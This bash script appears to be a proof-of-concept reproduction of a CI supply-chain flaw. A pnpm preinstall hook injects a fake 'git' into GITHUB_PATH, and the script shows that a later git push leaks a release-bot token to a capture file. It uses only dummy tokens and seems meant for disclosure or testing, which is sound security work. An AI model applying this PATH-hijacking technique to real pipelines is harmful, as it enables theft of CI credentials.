#!/usr/bin/env bash
set -euo pipefail

repro_dir="$(cd "$(dirname "$0")" && pwd)"
work_dir="$(mktemp -d)"
trap 'rm -rf "$work_dir"' EXIT

printf 'executed_utc=%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"

cp "$repro_dir/package.json" "$work_dir/package.json"
cp "$repro_dir/pnpm-lock.yaml" "$work_dir/pnpm-lock.yaml"
cp "$repro_dir/attacker-preinstall.sh" "$work_dir/attacker-preinstall.sh"
mkdir -p "$work_dir/fake-bin"
cp "$repro_dir/fake-bin/git" "$work_dir/fake-bin/git"

export GITHUB_PATH="$work_dir/github-path"
export CAPTURE_FILE="$work_dir/capture.txt"
: > "$GITHUB_PATH"

(
  cd "$work_dir"
  export COREPACK_HOME="$work_dir/corepack"
  corepack pnpm@11.0.8 install --frozen-lockfile
)

injected_path="$(tail -n 1 "$GITHUB_PATH")"
test "$injected_path" = "$work_dir/fake-bin"
test -x "$injected_path/git"
resolved_git="$(PATH="$injected_path:$PATH" command -v git)"
test "$resolved_git" = "$injected_path/git"

PATH="$injected_path:$PATH" \
  APP_TOKEN="DUMMY_RELEASE_BOT_TOKEN" \
  git push \
    "https://x-access-token:DUMMY_RELEASE_BOT_TOKEN@github.com/tempoxyz/wallet-cli.git" \
    "HEAD:dummy-branch"

grep -Fq 'DUMMY_RELEASE_BOT_TOKEN' "$CAPTURE_FILE"
printf 'Dummy-only capture:\n'
cat "$CAPTURE_FILE"
